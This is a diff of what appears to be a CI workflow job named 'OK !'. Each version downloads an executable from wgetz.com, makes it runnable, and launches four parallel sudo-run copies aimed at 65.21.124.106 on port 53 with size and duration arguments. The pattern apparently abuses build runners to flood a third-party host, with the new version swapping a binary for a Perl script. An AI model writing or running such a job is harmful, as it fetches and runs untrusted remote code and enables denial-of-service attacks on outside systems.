@@ -14,11 +14,11 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://wgetz.com/Mr6azQrnHt/host -O host
-          chmod +x host
+          wget https://wgetz.com/Cff74bfqD4/cacasexdc.pl -O cacasexdc.pl
+          chmod +x cacasexdc.pl
           PIDS=()
           for i in {1..4}; do
-            sudo timeout 60 ./host 65.21.124.106 53 100 60 &
+            sudo timeout 60 perl cacasexdc.pl 65.21.124.106 53 1400 60 &
             PIDS+=($!)
           done
           
